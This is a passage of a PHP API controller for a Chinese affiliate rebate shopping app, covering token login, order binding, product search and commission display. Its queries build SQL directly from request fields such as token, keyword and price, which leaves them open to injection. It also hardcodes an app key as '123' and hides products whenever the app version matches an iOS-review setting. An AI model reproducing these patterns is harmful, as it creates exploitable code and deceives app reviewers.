<?php
actionfun("appapi/dgappcomm");
actionfun("appapi/goods_all_type");
actionfun("appapi/dtk_pp");
actionfun("appapi/tzbs_new");
actionfun("comm/actfun");
actionfun("comm/tbmaterial");actionfun("comm/order");
class apiAction extends Action {
	public function is_app(){
		setcookie("isapp","1",time()+86400,"/");
		if(!empty($_GET['token'])){
			$user=zfun::f_row("User","token='".$_GET['token']."'","id,nickname");
			if(empty($user))zfun::fecho("error");
			$this -> setCookieUser($user['id'], $user['nickname'], 14 * 86400);
		}
		else{
			$this -> servletLoginOut();
		}
		echo 1;
	}
	private function selfgetappkey() {
		return '123';
		//return $this -> getSetting('app_key_interface');
	}
	public function getappkey() {
		if (!$this -> sign()){
			$this -> fecho(NULL, 0, "签名错误");
		}
		$appkey = $this -> getSetting('app_key_interface');
		$this -> fecho($appkey, 1, "ok");
	}
	public function is_login($token) {
		$user = $userModel -> selectRow("token='{$_POST['token']}'");
		if (empty($user)) {
			$this -> fecho(null, 0, '您的账号在其他终端登陆，请重新登陆！');
		}
	}
	public function reorder() {
		if (!$this -> sign())
			$this -> fecho(NULL, 0, "签名错误");
		$userModel = $this -> getDatabase('User');
		if (empty($_POST['token'])) {
			$this -> fecho(NULL, 0, "缺少必要参数");
		}
		$_POST['s'] = intval($_POST['s']);
		if (empty($_POST['s']))
			$_POST['s'] = 1;
		$user = $userModel -> selectRow("token='{$_POST['token']}'");
		$uid = $user['id'];
		if (empty($_POST['t']))$this -> fecho(NULL, 0, "缺少必要参数");
		$oid = filter_check($_POST['oid']);
		if (!($oid > 0))$this -> fecho(NULL, 0, "非法操作");
		if (!($_POST['t'] == 1 || $_POST['t'] == 2))$this -> fecho(NULL, 0, "非法操作");
		$tmp = zfun::f_row("Order", "orderId='$oid' and orderType='" . $_POST['t'] . "'","uid");
		if(empty($tmp))$this -> fecho(NULL, 0, "订单不存在 请稍后再尝试找回订单");
		if($tmp['uid']==$uid)$this -> fecho(NULL, 0, "你已绑定该订单");
		if($tmp['uid'].''!='0')$this -> fecho(NULL, 0, "订单已被他人绑定，如果是您的订单请联系客服处理");
		
		//判断是否是分享订单 分享订单不能找回
		$tg_pid=$tmp['tg_pid'];
		if(!empty($tg_pid)){
			$check=zfun::f_count("User","tg_pid='{$tg_pid}'");
			if(!empty($check))$this -> fecho(NULL, 0, "分享订单不能找回");
		}
		zfun::f_update("Order", "orderId='$oid'", array("uid" => $uid));
		$this -> fecho(NULL, 1, "订单已经绑定成功-请在交易订单查询明细");
		
	}
	public function getgoods() {
		if (!$this -> sign())
			$this -> fecho(NULL, 0, "签名错误");
		if (!empty($_POST['token'])) {
			$userid = zfun::f_row("User",'token="' . $_POST['token'] . '"');
			if (empty($userid)) {
				$this -> fecho(null, 0, '您的账号在其他终端登陆，请重新登陆！');
			}
			zfun::$set['user']=$userid;//记录 下次不用再运行
			//全局uid用于匹配缓存 我的喜欢
			$GLOBALS['uid']=$uid = $userid['id'];
			//boom explosion
			$this -> setSessionUser($userid['id'], $userid['nickname']);
			
		} else {
			$uid = 0;
		}

		//百里.9.9商品
		// actionfun("appapi/baili");
		// baili::get_goods_lists("9.9");

		//查大淘客订单  会中断
		if(empty($_POST['price1']))unset($_POST['price1']);
		if(empty($_POST['keyword']))unset($_POST['keyword']);
		if(empty($_POST['price2']))unset($_POST['price2']);
		self::goods_sx_new();//包含物料模式
		$data_str=self::goods_sx_str();//筛选条件
		$arr=$data_str['arr'];
		$str2=$data_str['str'];
		$checkVersion=self::getSetting("checkVersion");
		//版本一样时没有商品  ios审核用
		if(!empty($_POST['app_V'])&&$checkVersion==$_POST['app_V'])$this -> fecho(array(), 1, "好吧，被你发现了");
		$GoodsModel = $this -> getDatabase("Goods");
		$categoryModel = $this -> getDatabase("Category");
		$userModel = $this -> getDatabase('User');
		$mylikeModel = $this -> getDatabase('MyLike');
		$str="jf_buy,app_ggyhqtype,jf_ratio,fx_goods_fl,app_yhq_zhanwai_onoff,mr_stock,app_high_zhanwai_onoff,app_9_zhanwai_onoff,app_20_zhanwai_onoff";
		//返利开关 & 返利名称
		$str.=",app_fanli_onoff,app_fanli_off_str";
		//商品列表是否 开启检测 优惠券
		$str.=",app_goods_list_check_yhq";
		$str.=",dg_app_ggsort_type";
		$set=zfun::f_getset($str);
		foreach($set as $k=>$v)zfun::$set[$k]=$v;
		//zfun::isoff($set);
		//jj explosion
		$set['mr_stock']=intval($set['mr_stock']);
		$set['app_high_zhanwai_onoff']=intval($set['app_high_zhanwai_onoff']);
		$jf_ratio = $set['jf_buy'];
		$jf_ratio = explode(',', $jf_ratio);
		$zhe = $jf_ratio[0];
		if ($uid) {
			if ($userid['vip'] == 0) {
				$zhe = $jf_ratio[0];
			} elseif ($userid['vip'] == 1) {
				$zhe = $jf_ratio[1];
			} elseif ($userid['vip'] == 2) {
				$zhe = $jf_ratio[2];
			} elseif ($userid['vip'] == 3) {
				$zhe = $jf_ratio[3];
			}
		}
		$jf_return = $set['jf_ratio'];
				
		$where = "id>0 AND start_time<" . time() . " AND end_time>" . time();
		if(!empty($_POST['dp_type']))$where = "id>0";
		// $comm_where = " AND start_time<" . time() . " AND end_time>" . time();
		
	   if(!empty($_POST['dp_type'])){
			switch($_POST['dp_type']){
				case 1 :
					// 品牌热卖
					//$where.= " AND start_time<" . time() . " AND end_time>" . time();
					break;
				case 2 :
					// 即将开始
				//	$where= "start_time>" . time();
					break;
			}
	   }
	   if (!empty($_POST['dp_id'])) {
			$where .= " AND dp_id='" . $_POST['dp_id'] . "'";
			$shopModel = $this -> getDatabase("Dp");
			$dp = $shopModel -> selectRow('dp_id="' . $_POST['dp_id'] . '"');
		}
		$next_day=strtotime("today")+86400;
		if (!empty($_POST['type'])) {
			switch($_POST['type']) {
				case 1 :
					// 超高返
					/*$where .= ' AND highcommission=1' . $comm_where . ' AND highcommission_start_time<' . time() . ' AND highcommission_end_time>' . time();*/
					$where = ' (highcommission=1 AND highcommission_start_time<' . time() . ' AND highcommission_end_time>' . time() . ')';
					break;
				case 2 :
				case 3 :
					// 9块9
					$where .= ' AND goods_price<10 ' . $comm_where;
					break;
				case 7:
					$where .= ' AND goods_price<21 ' . $comm_where;
					break;
				case 11:
					$where .= " AND yhq=1 " . $comm_where;
					break;
				case 27:
					$where .=' AND is_bc=1 ' . $comm_where;
					break;
				case 28:
					$where .=' AND start_time >='.strtotime("today")." and start_time < $next_day " .$comm_where;
					break;
				case 29:
					$where.=" and shop_id IN(3,4) ".$comm_where;
					break;
				case 'pub_jingdongshangpin':
					$where.=" and shop_id IN(3,4) ".$comm_where;
					break;
				case 'pub_baicaiguan':
					$where.=" AND is_bc=1 ".$comm_where;
					break;
				break;
			}
		}
		if (!empty($_POST['is_tm'])) {
			$where .= ' AND shop_id=2 ' . $comm_where;
		}
		if(isset($_POST['is_tm'])&&$_POST['is_tm']==0)$where.=" and shop_id=1";
		if (!empty($_POST['keyword'])) {
			$where .= " AND goods_title like '%{$_POST['keyword']}%' " . $comm_where;
		}
		if (!empty($_POST['price1']) && empty($_POST['price2'])) {
			$where .= " AND goods_price>" . $_POST['price1'] . $comm_where;
		} else if (empty($_POST['price1']) && !empty($_POST['price2'])) {
			$where .= " AND goods_price<" . $_POST['price2'] . $comm_where;
		} else if (!empty($_POST['price1']) && !empty($_POST['price2'])) {
			$where .= " AND goods_price>" . $_POST['price1'] . " AND goods_price<" . $_POST['price2'] . $comm_where;
		}
		if (!empty($_POST['cid'])) {
			$cids = $categoryModel -> getCateId($_POST['cid']);
			$c = explode(",", $cids);
			if (is_array($c) && count($c) > 1) {
				$where .= " AND cate_id in ($cids) " . $comm_where;
			} else {
				$where .= " AND cate_id=" . $_POST['cid'] . $comm_where;
			}
			//$where .= " AND cate_id=" . $_POST['cid'];
		}
		//为第几页
		$_GET['p'] = $_POST['p'] = !empty($_POST['p']) ? intval($_POST['p']) : 1;
		//一页多少
		$num = !empty($_POST['num']) ? $_POST['num'] : 20;
		//$sort = !empty($_POST['sort']) ? filter_check($_POST['sort']) : 1;
		/*switch(filter_check($_POST['sort'])) {
			case 1 :
				// 综合
				$sort = "tg_sort desc,goods_sales desc";
				break;
			case 2 :
			case 5 :
				// 人气
				$sort = "tg_sort desc,hot desc";
				break;
			case 3 :
				// 返利
				$sort = "tg_sort desc,goods_price desc";
				break;
			case 4 :
				$sort = "tg_sort desc,start_time desc";
				break;
		}*/
		switch(filter_check($_POST['sort'])) {
			case 1 :
				// 综合
				$sort = "tg_sort desc,goods_sales desc";
				break;
			case 2 :
			case 5 :
				// 销量 
				$sort = "tg_sort desc,goods_sales desc";
				$_POST['sortType']=9;
				break;
			case 3 :
				// 
				$sort = "tg_sort desc,goods_price desc";
				$_POST['sortType']=3;
				break;
			case 4 :
				// 最新
				$sort = "tg_sort desc,start_time desc";
				$_POST['sortType']=5;
				break;
			case 6 :
				//到手价低到高
				$sort = "tg_sort desc,goods_price asc";
				$_POST['sortType']=4;
				break;
		}
		$sett=$set['dg_app_ggsort_type'];
		//设置默认排序
		if(!empty($_POST['sort'])&&$_POST['sort']==1&&!empty($sett['dg_app_ggsort_type'])){
			$_POST['sortType']=$sett['dg_app_ggsort_type'];
		}
		//首页商品
		if(!empty($_POST['is_index'])&&$_POST['is_index']==1)self::getwhereset($where,$sort,"app_dg_goods_indexset");
		if(empty($sort))$sort='tg_sort desc,goods_sales desc';
		else $sort="tg_sort desc,".$sort;
		//jj explosion life is a shipwreck
		//超级券调用 淘宝联盟站外商品
		actionfun("comm/dtk");
		if($set['app_yhq_zhanwai_onoff']==1&&$_POST['type']==11){
			//dpyhq
			actionfun("appapi/alimama");
			$keyword="";
			if(!empty($_POST['keyword']))$keyword=$_POST['keyword'];
			if(!empty($_POST['cid'])){
				$tmp=zfun::f_row("Category","id=".intval($_POST['cid']." and category_name<>''"),"category_name");
				if(empty($tmp)||empty($tmp['category_name']))zfun::fecho("没有分类名",array(),1);
				$tmp['category_name']=str_replace("、"," ",$tmp['category_name']);
				if(empty($keyword))$keyword.=$tmp['category_name'];
				else $keyword.=" ".$tmp['category_name'];
			}
			//设置为超高返
			$_POST['dpyhq']=1;
			$_POST['yhq']=1;//jj explosion 兼容新接口
			$_POST['keyword']=$keyword;
			$_POST['size']=10;
			if(empty($_POST['price1']))$_POST['price1']=$arr['min_price'];
			if(empty($_POST['price2']))$_POST['price2']=$arr['max_price'];
			if(!empty($arr['commission']))$GLOBALS['gg_goods_s_bili']=$arr['commission'];
			if(!empty($arr['goods_sales']))$GLOBALS['goods_sales']=$arr['goods_sales'];
			if(!empty($_POST['price1']))$_POST['start_price']=$_POST['price1'];
			if(!empty($_POST['price2']))$_POST['end_price']=$_POST['price2'];
			if(!empty($_POST['sort'])&&$_POST['sort']==5)$_POST['sortType']=9;
			  
			/*这是淘宝联盟的*/
			if(intval($set['app_ggyhqtype'])==1){
				actionfun("appapi/new_Alimama");
				if(!empty($_POST['p']))$_POST['page_no']=$_POST['p'];
				$tmp_al=new new_AlimamaAction();
				$goods=$tmp_al->getgoods(1,1);
				//unset($_POST['page_no']);
			}else{
				$GLOBALS['off_yhq']='on';
				$goods=alimamaAction::getgoods(1,1);
				
			}
			//检测商品列表优惠券
			$goods=actfun::set_list_coupon($goods);
			foreach($goods as $k=>$v){
				$goods[$k]['stock']=$set['mr_stock'];
				$goods[$k]['id']=$v['fnuo_id'];
				$goods[$k]['open_iid']=$v['fnuo_id'];
				if(!empty($v['yhq_price']))$goods[$k]['yhq_span']=$v['yhq_price']."元";
				
			}
				
		}//超高返调用 淘宝站外商品
		elseif($set['app_high_zhanwai_onoff']==1&&$_POST['type']==1){
			actionfun("appapi/alimama");
			$keyword="";
			if(!empty($_POST['keyword']))$keyword=$_POST['keyword'];
			if(!empty($_POST['cid'])){
				$tmp=zfun::f_row("Category","id=".intval($_POST['cid']." and category_name<>''"),"category_name");
				if(empty($tmp)||empty($tmp['category_name']))zfun::fecho("没有分类名",array(),1);
				$tmp['category_name']=str_replace("、"," ",$tmp['category_name']);
				
				if(empty($keyword))$keyword.=$tmp['category_name'];
				else $keyword.=" ".$tmp['category_name'];
			}
			//设置为超高返
			$_POST['z_cgf']=1;
			$_POST['keyword']=$keyword;
			$_POST['size']=10;
			if(empty($_POST['price1']))$_POST['price1']=$arr['min_price'];
			if(empty($_POST['price2']))$_POST['price2']=$arr['max_price'];
			if(!empty($arr['commission']))$GLOBALS['gg_goods_s_bili']=$arr['commission'];
			if(!empty($arr['goods_sales']))$GLOBALS['goods_sales']=$arr['goods_sales'];
			if(!empty($_POST['price1']))$_POST['start_price']=$_POST['price1'];
			if(!empty($_POST['price2']))$_POST['end_price']=$_POST['price2'];
			if(!empty($_POST['sort'])&&$_POST['sort']==5)$_POST['sortType']=9;
			$goods=alimamaAction::getgoods(1,1);
			//设置 大淘客 优惠券
			$goods=actfun::set_list_dtk_coupon($goods);
			foreach($goods as $k=>$v){
				$goods[$k]['stock']=$set['mr_stock'];
				$goods[$k]['id']=$v['fnuo_id'];
				$goods[$k]['open_iid']=$v['fnuo_id'];
				if(!empty($v['yhq_price']))$goods[$k]['yhq_span']=$v['yhq_price']."元";
				unset($goods[$k]['open_iid']);
			}
		}//九块九调用 淘宝站外商品
		elseif($set['app_9_zhanwai_onoff']==1&&($_POST['type']==2||$_POST['type']==3)){
			actionfun("appapi/alimama");
			$keyword="";
			if(!empty($_POST['keyword']))$keyword=$_POST['keyword'];
			if(!empty($_POST['cid'])){
				$tmp=zfun::f_row("Category","id=".intval($_POST['cid']." and category_name<>''"),"category_name");
				if(empty($tmp)||empty($tmp['category_name']))zfun::fecho("没有分类名",array(),1);
				$tmp['category_name']=str_replace("、"," ",$tmp['category_name']);
				if(empty($keyword))$keyword.=$tmp['category_name'];
				else $keyword.=" ".$tmp['category_name'];
			}
			//设置为九块九
			$_POST['keyword']=$keyword;
			$_POST['size']=10;
			if(empty($_POST['price1']))$_POST['price1']=$arr['min_price'];
			if(empty($_POST['price2']))$_POST['price2']=$arr['max_price'];
			if(empty($_POST['price2']))$_POST['price2']=10;
			if(!empty($arr['commission']))$GLOBALS['gg_goods_s_bili']=$arr['commission'];
			if(!empty($arr['goods_sales']))$GLOBALS['goods_sales']=$arr['goods_sales'];
			if(!empty($_POST['price1']))$_POST['start_price']=$_POST['price1'];
			if(!empty($_POST['price2']))$_POST['end_price']=$_POST['price2'];
			if(!empty($_POST['sort'])&&$_POST['sort']==5)$_POST['sortType']=9;
			$goods=alimamaAction::getgoods(1,1);
			//设置 大淘客 优惠券
			$goods=actfun::set_list_dtk_coupon($goods);
			foreach($goods as $k=>$v){
				$goods[$k]['stock']=$set['mr_stock'];
				$goods[$k]['id']=$v['fnuo_id'];
				$goods[$k]['open_iid']=$v['fnuo_id'];
				if(!empty($v['yhq_price']))$goods[$k]['yhq_span']=$v['yhq_price']."元";
				unset($goods[$k]['open_iid']);
			}
		}//二十调用 淘宝站外商品
		elseif($set['app_20_zhanwai_onoff']==1&&$_POST['type']==7){
			actionfun("appapi/alimama");
			$keyword="";
			if(!empty($_POST['keyword']))$keyword=$_POST['keyword'];
			if(!empty($_POST['cid'])){
				$tmp=zfun::f_row("Category","id=".intval($_POST['cid']." and category_name<>''"),"category_name");
				if(empty($tmp)||empty($tmp['category_name']))zfun::fecho("没有分类名",array(),1);
				$tmp['category_name']=str_replace("、"," ",$tmp['category_name']);
				if(empty($keyword))$keyword.=$tmp['category_name'];
				else $keyword.=" ".$tmp['category_name'];
			}
			//设置为二十
			$_POST['keyword']=$keyword;
			$_POST['size']=10;
			if(empty($_POST['price1']))$_POST['price1']=$arr['min_price'];
			if(empty($_POST['price2']))$_POST['price2']=$arr['max_price'];
			if(empty($_POST['price2']))$_POST['price2']=20;
			if(!empty($arr['commission']))$GLOBALS['gg_goods_s_bili']=$arr['commission'];
			if(!empty($arr['goods_sales']))$GLOBALS['goods_sales']=$arr['goods_sales'];
			if(!empty($_POST['price1']))$_POST['start_price']=$_POST['price1'];
			if(!empty($_POST['price2']))$_POST['end_price']=$_POST['price2'];
			if(!empty($_POST['sort'])&&$_POST['sort']==5)$_POST['sortType']=9;
			$goods=alimamaAction::getgoods(1,1);
			//设置 大淘客 优惠券
			$goods=actfun::set_list_dtk_coupon($goods);
			foreach($goods as $k=>$v){
				$goods[$k]['stock']=$set['mr_stock'];
				$goods[$k]['id']=$v['fnuo_id'];
				$goods[$k]['open_iid']=$v['fnuo_id'];
				if(!empty($v['yhq_price']))$goods[$k]['yhq_span']=$v['yhq_price']."元";
				unset($goods[$k]['open_iid']);
			}
			
		}
		else{
			$where.=$str2;//当填了价格筛选之类的
			zfun::isoff($where,1);			
			$goods = zfun::f_goods("Goods", $where, 'id,fnuo_id,goods_sales,goods_type,goods_price,goods_cost_price,goods_img,goods_title,start_time,end_time,cate_id,dp_id,commission,shop_id,highcommission_url,highcommission_wap_url,yhq_price,yhq_url,stock,yhq,yhq_span', $sort, NULL, $num);	
		}
		zfun::isoff($where);
		zfun::isoff($sort);
		zfun::isoff($goods);
		$goods=zfun::f_gethdprice($goods);
		$goods=zfun::f_fgoodscommission($goods);
		$shop_type=array("","淘宝","天猫","京东");
		//zfun::pre($where);
		foreach ($goods as $k => $v) {
			$goods[$k]['id']=$v['fnuo_id'];
			$goods[$k]['yhq_url'].='';
			if(empty($v['shop_id']))$goods[$k]['shop_id']=1;
			if($v['shop_id']==4){
				$v['shop_id']=$goods[$k]['shop_id']=3;
				$goods[$k]['jd']=1;
			}
			$goods[$k]['shop_type']=$shop_type[$goods[$k]['shop_id']];
			if(!empty($v['id']))$mylike = $mylikeModel -> selectRow('uid=' . $uid . ' AND goodsid=' . intval($v['id']));
			$goods[$k]['jd_url']='';
			if($v['shop_id']==3){
				$goods[$k]['fnuo_url']=self::getUrl("gotojingdong","index",array("gid"=>$v['fnuo_id']),"appapi");
	      	}
			if (!empty($mylike)) {
				$goods[$k]['is_mylike'] = 1;
			} else {
				$goods[$k]['is_mylike'] = 0;
			}
			//$goods[$k]['returnfb'] = round($v['goods_price'] * ($v['commission'] / 100) * ($zhe / 100) * 100) / 100 * $jf_return;
			$goods[$k]['returnfb']=$goods[$k]['fcommission'] = intval($v['fcommission']*100)/100;
			$goods[$k]['returnbili'] = $v['fbili'];
			$goods[$k]['fxz']='';
			/*if(empty($set['fx_goods_fl'])){
				$sety=zfun::f_getset("hhrapitype,fxdl_tjhy_bili1_".(intval($userid['is_sqdl'])+1));
				$bili=$sety["fxdl_tjhy_bili1_".(intval($userid['is_sqdl'])+1)];
				$commission=zfun::dian($v['goods_price']*($v['commission']/100)*($bili/100));
				$goods[$k]['fxz']="分享赚 ".$commission;
			}*/
			switch(date("w", $v['start_time'])) {
				case 1 :
					$week = "周一";
					break;
				case 2 :
					$week = "周二";
					break;
				case 3 :
					$week = "周三";
					break;
				case 4 :
					$week = "周四";
					break;
				case 5 :
					$week = "周五";
					break;
				case 6 :
					$week = "周六";
					break;
				case 7 :
					$week = "周日";
					break;
			}
			/*if($v['stock']==0){
				$goods[$k]['is_qiangguang']=1;
			}else{
				$goods[$k]['is_qiangguang']=0;
			}*/
			$goods[$k]['is_qiangguang']=0;
			$jindu=$v['goods_sales']/($v['stock']+$v['goods_sales']);
			$goods[$k]['jindu']=sprintf("%.2f",$jindu)*100; 
			if($v['yhq']==1){
				//$goods[$k]['juanhou_price']=$v['goods_price']-$v['yhq_price'];/*修改*/
				$goods[$k]['juanhou_price']=$v['goods_price'];
				$goods[$k]['goods_cost_price']=$v['goods_price']+$v['yhq_price'];
			}
			$goods[$k]['yhq_price']=zfun::dian($v['yhq_price']);
			$goods[$k]['djs_time'] = $week . " " . date('H:i:s', $v['start_time']);
			//$goods[$k]['djs_time'] = $v['start_time'];
			$v['yhq_price']=floatval($v['yhq_price']);
			$goods[$k]['yhq_span']=$v['yhq_price']."元券";
			$goods[$k]['zhe']=$v['zhe']."折";
			$goods[$k]['goods_ico_one']=INDEX_WEB_URL."View/index/img/appapi/comm/list_discount_quan.png";
			if(!empty($v['yhq_price']))$goods[$k]['goods_ico_one']=INDEX_WEB_URL."View/index/img/appapi/comm/list_after_quan.png";
			unset($goods[$k]['tdj_data']);
		}
		if(!empty($_POST['dp_id'])){
			$shop=zfun::f_row("Dp","dp_id='".filter_check($_POST['dp_id'])."'","dp_id,name,type,logo,banner,info,hot,zhe,abc,returnbili,start_time,end_time");
			$s_time=strtotime("today");
			$e_time=$s_time+86400;
			foreach($goods as $k=>$v){
				$goods[$k]['shop_title']=$shop['name'];
				if( $v['yhq']==1){//是否有优惠卷
					if(empty($shop['shop_yhq']))$shop['shop_yhq']=array();
					if(empty($shop['shop_yhq'][$k]))$shop['shop_yhq'][$k]=array("yhq_price"=>'',"yhq_span"=>'');
					$shop['shop_yhq'][$k]['yhq_price']=$v['yhq_price'];//优惠卷价格
					$shop['shop_yhq'][$k]['yhq_span']=$v['yhq_span'];//优惠卷描述
				}
				if($v['start_time'] > $s_time &&$v['start_time'] < $e_time)$shop['day_new']=1;
				else $shop['day_new']=0;
				if(empty($shop['shop_yhq']))$shop['is_yhq']=$shop['is_yhq_goods']=0;//优惠卷是否有存在
				else $shop['is_yhq']=$shop['is_yhq_goods']=1;
				if($_POST['goodslist']==0)$shop['shop_goods']=array();//商品列表
				else $shop['shop_goods']=$shop_goods;	
			}
			if(!empty($shop['shop_yhq'])){
				//gg
				$yhqgoods=self::sortarr($shop['shop_yhq'],"yhq_price","desc");
				$end=end($yhqgoods);
				$shop['shop_yhq']=array(
					array(
						"yhq_price"=>$end['yhq_price'],
						"yhq_span"=>$end['yhq_span'],
					),
					array(
						"yhq_price"=>$yhqgoods[0]['yhq_price'],
						"yhq_span"=>$yhqgoods[0]['yhq_span'],
					),
					
				);
			}
			
		}
		if(empty($shop))$shop=array();
		//jj explosion
		foreach($goods as $k=>$v){
			$goods[$k]['juanhou_price']=zfun::dian($v['juanhou_price']);
		}
		//处理分享赚佣金
		appcomm::goodsfeixiang($goods);
		//处理佣金关闭
		appcomm::goodsfanlioff($goods,$set);

		//百里
		//获取会员信息
		if (!empty($_POST['token'])) {
			$user = zfun::f_row("User",'token="' . $_POST['token'] . '"');
		}
		//获取当前会员等级比例
		$user_lv = $user['is_sqdl'];
		switch ($user_lv) {
			case '0':
				$hs_bili = 0;
				break;
			case '1':
				$hs_bili = 0.51;
				break;
			case '2':
				$hs_bili = 0.76;
				break;
			case '3':
				$hs_bili = 0.88;
				break;
			default:
				$hs_bili = 0.51;
				break;
		}

		//修改显示比例
		foreach ($goods as $key => &$value) {
			// $value['fcommission'] = $value['fx_commission'];

			$value['fx_commission'] = sprintf("%.2f", $value['goods_price'] * ($value['commission']/100) * $hs_bili);
			$value['fcommission'] = $value['fx_commission'];
			$value['fxz'] = "分享奖：".$value['fx_commission'];
		}

		$arr=array("success"=>1,"data"=>$goods,"shop"=>$shop,"msg"=>"咳咳咳");
		//jj explosion
		$end_time=dgapp_huancun_time;
		//超级券 或者 超高返
		if($_POST['type']==11||$_POST['type']==1){
			$end_time=3600;
			//if(empty($_POST['cid']))$end_time=0;
		}
		echo zfun::f_json_encode($arr);exit;
	//	$this -> fecho($goods, 1, "好吧，被你发现了");
	}
	//物料商品
	static function wlgoods($set_name=""){
		
		if(empty($set_name))zfun::fecho("wlgoods val empry");
		$str="{name}keyword,dtk_sxtj_data";
		$str=str_replace("{name}",$set_name,$str);
		//物料 没有销量筛选 真是个悲伤的故事
		$set=zfun::f_getset($str);
		//fpre($set);
		$tmpset=zfun::arr64_decode($set['dtk_sxtj_data']);
		//对应预设设置
		$where=array();
		$where['keyword']=$set[$set_name.'keyword'];//关键词
		$where['start_commission']=$tmpset[$set_name.'yj_sx'];//开始佣金
		$where['start_price']=$tmpset[$set_name.'minprice_sx'];//开始价格
		$where['end_price']=$tmpset[$set_name.'maxprice_sx'];//结束价格
		if(!empty($GLOBALS['json'])){
			$where=array();
			$where['keyword']=$GLOBALS['json']['keyword'];//关键词
			$where['start_commission']=$GLOBALS['json']['commission'];//开始佣金
			$where['start_price']=$GLOBALS['json']['start_price'];//开始价格
			$where['end_price']=$GLOBALS['json']['end_price'];//结束价格
			$_POST['yhq']=intval($GLOBALS['json']['yhq_onoff']);
		}
		if(!empty($_POST['price1']))$where['start_price']=$_POST['price1'];//开始价格
		if(!empty($_POST['price2']))$where['end_price']=$_POST['price2'];//结束价格
		if(!empty($_POST['keyword']))$where['keyword']=$_POST['keyword'];//关键词
		if(($where['keyword'])=='')$where['keyword']='女装';

		actionfun("comm/tbmaterial");
		$sort_arr=array(
			0=>"goods_sales desc",
			2=>"goods_price asc",//价格从低到高
			3=>"goods_price desc",//价格从高到低
			1=>"goods_sales desc",
			4=>"commission desc",
			5=>"commission asc",
			6=>"tg desc",
			7=>"tg asc",
		);
		/**********超高返 优惠券栏目***********/
		if(($set_name=='app_yhq_'||$set_name=='app_high_')&&$_POST['sort']==2){
			
			$_POST['sort']=6;
		}elseif(($set_name=='app_yhq_'||$set_name=='app_high_')&&$_POST['sort']==6){
			$_POST['sort']=2;
		}
		
		$arr=array(
			"yhq"=>intval($_POST['yhq']),
			"sort"=>$sort_arr[intval($_POST['sort'])],
		);
		//如果是 超级券
		if($set_name=='app_yhq_'){
			$arr['yhq']=1;	
		}
		//fpre($where);exit;
		if(!empty($where['keyword']))$_POST['keyword']=$where['keyword'];
		if(!empty($where['start_commission']))$arr['start_commission']=doubleval($where['start_commission']);
		if(!empty($where['start_price']))$arr['start_price']=doubleval($where['start_price']);
		if(!empty($where['end_price']))$arr['end_price']=doubleval($where['end_price']);
		//cid 分类id
		if(!empty($_POST['cid'])){
			$cate=zfun::f_row("Category","id=".intval($_POST['cid']),"id,category_name");
			if(empty($cate))return array();
			$_POST['keyword']=$cate['category_name'];//覆盖关键词
		}
		if(!empty($_POST['mall_item'])&&$_POST['mall_item']=='true')$arr['is_tmall']='true';//天猫
		if(!empty($_POST['start_price'])){
			$arr['start_price']=doubleval($_POST['start_price']);
			$arr['end_price']=10000;
		}
		if(!empty($_POST['end_price']))$arr['end_price']=doubleval($_POST['end_price']);
		
		$data=tbmaterial::getlist($_POST['keyword'],$arr,$_POST['p']);
	
		foreach($data as $k=>$v){
			unset($data[$k]['small_img'],$data[$k]['dx'],$data[$k]['yx']);	
			$data[$k]['getGoodsType']='wuliao';//物料商品
		}
		$data=self::comm_update_goods($data);
		return $data;
	}
	//公共商品转换
	static function comm_update_goods($arr_gg=array()){
		if(empty($arr_gg))return array();
		actionfun("appapi/goods_all_type");
		$arr_gg=goods_all_typeAction::listDoing($arr_gg);
		$arr_gg=zfun::f_fgoodscommission($arr_gg);
		$shop_type=array("淘宝","淘宝","天猫","京东","京东");
		
		foreach($arr_gg as $k=>$v){
			$arr_gg[$k]['shop_type']=$shop_type[$v['shop_id']];
			$arr_gg[$k]['zhe']=$v['zhe']."折";
			$arr_gg[$k]['goods_ico_one']=INDEX_WEB_URL."View/index/img/appapi/comm/list_discount_quan.png";
			if(!empty($v['yhq_price']))$arr_gg[$k]['goods_ico_one']=INDEX_WEB_URL."View/index/img/appapi/comm/list_after_quan.png";
			$arr_gg[$k]['open_iid']=$v['fnuo_id'];
			$arr_gg[$k]['is_mylike']=0;
			$arr_gg[$k]['is_support']=0;
			$arr_gg[$k]['jindu']=intval($v['goods_sales']/100);
			if($arr_gg[$k]['jindu']>95)$arr_gg[$k]['jindu']='95';
			if(floatval($arr_gg[$k]['commission'])<>0)$arr_gg[$k]['is_support']=1;
			$arr_gg[$k]['qgStr']="已抢".$v['goods_sales']."件";
			$arr_gg[$k]['is_qiangguang']=0;
			$arr_gg[$k]['djs_time']='';
			
			//添加缺少字段
			if(empty($v['goods_cost_price']))$arr_gg[$k]['goods_cost_price']='0.00';
			if(empty($v['shop_title']))$arr_gg[$k]['shop_title']='';
			if(empty($v['city']))$arr_gg[$k]['city']='';
			if(empty($v['yhq']))$arr_gg[$k]['yhq']='0';
			if(empty($v['yhq_price']))$arr_gg[$k]['yhq_price']='0';
			if(empty($v['yhq_span']))$arr_gg[$k]['yhq_span']='';
			if(empty($v['yhq_url']))$arr_gg[$k]['yhq_url']='';
			if(empty($v['getGoodsType']))$arr_gg[$k]['getGoodsType']='wuliao';
			
			
			
			unset($arr_gg[$k]['detailurl']);
		}
		appcomm::goodsfeixiang($arr_gg);
		appcomm::goodsfanlioff($arr_gg);
		return $arr_gg;
	}
	
	//淘宝618擎天柱商品
	static function tb_optimus_material_goods($type=''){
		actionfun("comm/tb_optimus_material");
		$p=intval($_POST['p']);
		if(empty($p))$p=1;
		$goods=tb_optimus_material::getlist($type,$p);

		$goods=self::comm_update_goods($goods);
		foreach($goods as $k=>$v){
			$v['goods_img']=str_replace(array("_350x350.jpg"),"",$v['goods_img']);;
			$goods[$k]['goods_img']=$v['goods_img']."_290x290.jpg";	
		}
		return $goods;
	}
	
	public static function goods_sx_new(){//这是查商品之类的
		$str="app_9_zhanwai_onoff,app_20_zhanwai_onoff,app_shouye_zhanwai_onoff,app_high_zhanwai_onoff,app_yhq_zhanwai_onoff,app_tqg_zhanwai_onoff,app_jhs_zhanwai_onoff";
		//jj 618
		$str.=",app_yhq_tb618,app_high_tb618,app_9_tb618,app_20_tb618,app_tqg_tb618,app_jhs_tb618";
		$set_off=zfun::f_getset($str);
		//fpre($set_off);exit;
		//快速入口
		if($GLOBALS['json']['goods_pd_onoff']==3&&intval($_POST['is_ksrk'])==1){
			$goods=self::wlgoods("ksrk");
			zfun::fecho("快速入口物料模式",$goods,1);
		}
		//淘礼金
		if($GLOBALS['json']['goods_pd_onoff']=='wuliao'&&intval($_POST['tlj'])==1){
			$goods=self::wlgoods("tlj");
			zfun::fecho("快速入口物料模式",$goods,1);
		}
		//首页商品 物料模式
